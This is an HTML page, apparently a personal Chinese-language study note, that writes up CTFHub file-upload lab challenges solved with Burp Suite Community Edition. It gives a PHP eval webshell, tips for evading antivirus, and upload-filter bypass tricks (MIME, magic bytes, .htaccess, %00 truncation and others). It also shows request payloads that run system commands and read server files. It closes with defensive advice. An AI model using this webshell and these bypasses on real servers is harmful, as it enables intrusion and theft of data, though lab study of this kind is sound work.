@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【微方法论】Burp Suite 文件上传漏洞基础利用手法小结</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【微方法论】Burp Suite 文件上传漏洞基础利用手法小结</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.19 | <strong>分类：</strong>Web安全 | <strong>标签：</strong>文件上传, BurpSuite社区版, 方法论, WebShell</p>
+    </div>
+    
+    <h2>1. 简介与核心逻辑</h2>
+    <p>文件上传漏洞的本质，是攻击者通过上传包含恶意代码的脚本文件（如 PHP、JSP、ASP），并通过访问该文件来执行系统命令或读取敏感信息。而 Burp Suite (简称 BP) 是绕过各类服务端/客户端校验、实现精确攻击的“瑞士军刀”。</p>
+    <p>本文是对 CTFHub 文件上传技能树实战经验的小结。本文所有操作均基于 <strong>Burp Suite 社区版 (Community Edition)</strong> 完成。</p>
+    
+    <div class="note">
+        <strong>关于工具使用的特别说明：</strong><br>
+        1. <strong>浏览器选择：</strong>理论上，只要给浏览器配置了 BP 的代理（通常为 127.0.0.1:8080），使用任何浏览器都能抓包。但本人还未安装代理插件（如 SwitchyOmega），而且不想折腾系统代理设置，于是直接使用了 <strong>Burp Suite 自带的浏览器（Burp's built-in browser）</strong>。它自带代理配置，无需额外设置。<br>
+        2. <strong>社区版注意事项：</strong>BP 社区版完全免费且包含 Proxy、Repeater 等核心功能，足以应对文件上传漏洞的练习。但社区版默认是“临时项目（Temporary Project）”，建议做题时不要随意关闭 BP，以防抓包记录丢失。同时，社区版修改请求体后，偶尔无法准确自动更新 Content-Length 长度，因此推荐手动计算长度。
+    </div>
+
+    <h2>2. 通用攻击流程（Burp Suite 社区版新手保姆级操作）</h2>
+    
+    <p><strong>第一步：环境与木马准备</strong></p>
+    <ul>
+        <li>在本地 <code>muma</code> 文件夹创建一个 PHP 木马文件。建议内容为：<code>GIF89a\n&lt;?php @eval($_POST['cmd']); ?&gt;</code>（首行的 <code>GIF89a</code> 是万能图片头，用于后续绕过文件头检查）。</li>
+        <li><strong>避坑：</strong>由于本地杀毒软件（如 Windows Defender）会拦截 PHP 木马，必须提前将 <code>muma</code> 文件夹加入杀软白名单。（比如我在桌面上建了个叫muma的文件夹）</li>
+        <li>打开 Burp Suite 社区版，点击顶部菜单 <code>Proxy</code> -> <code>Intercept</code>，确保按钮显示为 <b>Intercept is on</b>（拦截开启）。</li>
+        <li>点击 BP 界面右上角的 <b>Open browser</b> 按钮，此时会弹出一个带有 Burp 标志的浏览器。以后所有的访问、点击上传操作，都在这一个 BP 自带浏览器里完成。</li>
+    </ul>
+
+    <p><strong>第二步：初始上传与抓包（改后缀/改类型）</strong></p>
+    <ol>
+        <li>在 <strong>BP 自带浏览器</strong> 的地址栏输入靶场 URL，并在网页上点击“选择文件”，选中我们的 <code>shell.php</code>。如果网页前端弹窗报错“不允许 PHP 文件”，就在本地将文件重命名为 <code>shell.jpg</code> 后再上传，以此骗过前端 JS。</li>
+        <li>点击 Submit 后，BP 自带浏览器会转圈。切回 BP 界面，点击 <code>Proxy</code> -> <code>Intercept</code>，此时能看到抓到的 POST 请求。</li>
+        <li>在请求框中找到文件块信息：
+            <pre><code>------WebKitFormBoundary...
+Content-Disposition: form-data; name="file"; filename="shell.jpg"
+Content-Type: application/x-php</code></pre>
+        </li>
+        <li>按需修改此处：
+            <ul>
+                <li><b>后缀绕过（前端验证关）：</b>将 <code>filename="shell.jpg"</code> 改回 <code>filename="shell.php"</code>。</li>
+                <li><b>MIME 绕过（MIME绕过关）：</b>将下方文件块中的 <code>Content-Type: application/x-php</code> 改为 <code>Content-Type: image/gif</code>。</li>
+            </ul>
+        </li>
+        <li>点击橙色的 <code>Forward</code> 放行。BP 自带浏览器上的网页会提示“上传成功”，记录返回的路径（如 <code>upload/shell.php</code>）。</li>
+    </ol>
+
+    <p><strong>第三步：Repeater 连马（发送命令，避开 400 报错）</strong></p>
+    <ol>
+        <li>点击 BP 的 <code>Proxy</code> -> <code>HTTP history</code>，在历史记录中找到刚才上传成功的那个 POST 请求，右键点击它，选择 <b>Send to Repeater</b>（或者按快捷键 <code>Ctrl + R</code>）。</li>
+        <li>点击顶部的 <b>Repeater</b> 标签页，进入重放界面。</li>
+        <li>修改第一行 URL：<code>POST /upload/shell.php HTTP/1.1</code>。</li>
+        <li>找到第 7 行左右的 <code>Content-Type: multipart/form-data;...</code>，将其修改为：<code>Content-Type: application/x-www-form-urlencoded</code>。</li>
+        <li>鼠标选中下方所有的 <code>------WebKitFormBoundary...</code> 及残留的文件内容，按键盘的 <b>Delete</b> 键全部清空。</li>
+        <li>在清空的位置，输入命令：<code>cmd=system("ls /");</code></li>
+        <li>将第 3 行的 <code>Content-Length: 326</code> 改成 <b>Content-Length: 19</b>（因为 <code>cmd=system("ls /");</code> 刚好是 19 个字符）。<strong>社区版特别提醒：</strong>请务必手动修改，不要依赖 BP 自动计算，否则很容易报 400 错误。</li>
+        <li><strong>关键检查：</strong>确认请求头最后一行（如 <code>Connection: keep-alive</code>）和请求体（<code>cmd=...</code>）之间，有一个<b>空行</b>。然后点击 <code>Send</code>。</li>
+    </ol>
+
+    <p><strong>第四步：全盘搜索与读取 Flag（连招）</strong></p>
+    <ol>
+        <li>如果 <code>ls /</code> 成功回显（如 bin、etc），将请求体替换为：<code>cmd=system("find / -name flag* 2>/dev/null");</code>（长度 <b>45</b>），点击 Send 获取目标路径（如 <code>/var/www/html/flag_xxx.php</code>）。</li>
+        <li>拿到路径后，放弃易失效的 <code>cat</code> 命令，改用 PHP 原生函数读取：<br>
+        <code>cmd=print_r(file_get_contents('/var/www/html/flag_xxx.php'));</code><br>
+        （注意路径两边必须加单引号，并根据实际路径重新计算 Content-Length，点击 Send 即可拿到 Flag）。</li>
+    </ol>
+
+    <h2>3. 常见校验机制与绕过汇总（实战 + 资料总结）</h2>
+    
+    <p class="note">已实战过关的机制：前端验证、MIME绕过、文件头检查、.htaccess。<br>
+    资料总结：由于当前平台缺少对应实战环境，以下技巧是查阅资料后整理的原理与操作步骤，仅供后续参考。</p>
+
+    <ul>
+        <li><b>无验证（已实战）：</b>直接上传 <code>shell.php</code>，不做任何修改即可放行。</li>
+        <li><b>前端验证（已实战）：</b>本地重命名为 <code>.jpg</code> 上传，BP 拦截后改回 <code>.php</code>。</li>
+        <li><b>MIME绕过（已实战）：</b>修改请求体中的 <code>Content-Type</code> 为 <code>image/gif</code> 或 <code>image/jpeg</code>。</li>
+        <li><b>文件头检查（已实战）：</b>木马文件内容开头加入 <code>GIF89a</code> 等魔数。</li>
+        <li><b>.htaccess（已实战）：</b>先上传 <code>.htaccess</code> 文件（内容为 <code>AddType application/x-httpd-php .jpg</code>），再上传 <code>shell.jpg</code>，使 JPG 被解析为 PHP。</li>
+        
+        <li><b>后缀大小写绕过（资料总结）：</b>如果 WAF 黑名单只过滤了小写 <code>.php</code>，可以将文件名改为 <code>shell.PHP</code> 或 <code>shell.Php</code>。Windows 系统不区分大小写，但 Linux 会解析后缀为 PHP 并执行。</li>
+        <li><b>双写后缀（资料总结）：</b>如果代码把 <code>php</code> 替换为空字符串，我们可以命名文件为 <code>shell.pphphp</code>。代码过滤掉中间的 <code>php</code> 后，剩下的字符串重新拼接为 <code>shell.php</code>。</li>
+        <li><b>点绕过 / 空格绕过（资料总结）：</b>利用 Windows 系统会自动删除文件名末尾的点和空格的特性。如果将文件命名为 <code>shell.php.</code> 或 <code>shell.php </code>，WAF 检测后缀为点或空格会放行，传到 Windows 服务器后，末尾的点/空格被自动去掉，变回 <code>shell.php</code>。也可利用 <code>shell.php::$DATA</code>（NTFS 数据流特性）。</li>
+        <li><b>00截断（资料总结）：</b>针对 PHP 5.2.0 以下版本。C 语言底层字符串遇到空字节 <code>%00</code> 会认为字符串结束。在 BP 抓包修改 URL 路径时，构造 <code>POST /?road=/var/www/html/upload/shell.php%00</code>，可截断后面拼接的随机文件名和后缀。</li>
+        <li><b>突破 getimagesize() / exif_imagetype()（资料总结）：</b>这两个函数要求文件必须是真实的图片结构。不仅开头要有魔数，还要有图片的长宽等。需要将 PHP 代码插入到真实图片的末尾，或者使用图马合成工具。</li>
+        <li><b>二次渲染（资料总结）：</b>最狠的防线。服务器把图片用图像库（如 GD）重新生成一张新图片，PHP 代码会被洗掉。绕过思路是分析图片的十六进制结构，将代码写入到不被图像处理库改变的区域（如 IDAT 块、注释区）。</li>
+    </ul>
+
+    <h2>4. 踩坑记录与复盘（血泪经验）</h2>
+    <ul>
+        <li><b>浏览器抓不到包的问题：</b>如果使用自己电脑的 Chrome/Edge 等浏览器（Open Browser）去上传文件，但没有给浏览器配置代理插件（如 SwitchyOmega），或者没有设置系统代理，BP 的 Proxy 模块是抓不到任何数据包的。解决办法要么是配置好代理，要么直接使用 BP 自带的 Open Browser 内置浏览器。</li>
+        <li><b>400 Bad Request 泥潭（Content-Length 陷阱）：</b>手动修改 POST 请求体后，必须精准计算 <code>Content-Length</code>。社区版 BP 自动计算有时会出错，建议手动计算。若不确定，可使用 BP 的 <code>Pretty</code> 视图添加参数，让工具自动填充长度。切记 Header 和 Body 之间必须且只能有一个空行。</li>
+        <li><b>GET 与 POST 混淆：</b>木马代码写的是 <code>$_POST['cmd']</code>，必须在 Repeater 中使用 POST 方式发送数据，绝不能图省事在浏览器地址栏拼 URL。</li>
+        <li><b>禁用函数与 Native 函数替代：</b>沙盒环境常禁用 <code>cat</code> 等系统命令（表现为无回显）。此时必须使用 PHP 内置文件读取函数 <code>print_r(file_get_contents(...))</code> 替代。</li>
+        <li><b>盲改 Content-Type 的“净化”陷阱：</b>在“文件头检查”关，若盲目将 <code>Content-Type</code> 改为 <code>image/jpeg</code>，可能导致服务端调用图像库把 PHP 代码洗掉。推荐使用 <code>image/gif</code> 或不修改该字段。</li>
+        <li><b>命令字符的极致严谨：</b>Linux 命令对空格敏感，<code>find / -name flag*</code> 漏打空格会导致命令失效。每次输入命令后，建议对照文档确认一遍。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><b>攻击链的核心：</b>文件上传漏洞利用的核心在于“欺骗”。欺骗前端JS、欺骗MIME检查、欺骗文件头检查，最终目的都是让恶意脚本落地并具备执行权限。</li>
+        <li><b>防御策略：</b>服务端绝对不能信任客户端任何数据。必须进行严格的白名单后缀校验（统一转小写）、MIME校验、文件内容检测。最核心的防御手段是<b>将上传目录的执行权限剥离（设为不可执行）</b>，无论什么后缀都无法执行，这才是安全的底线。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
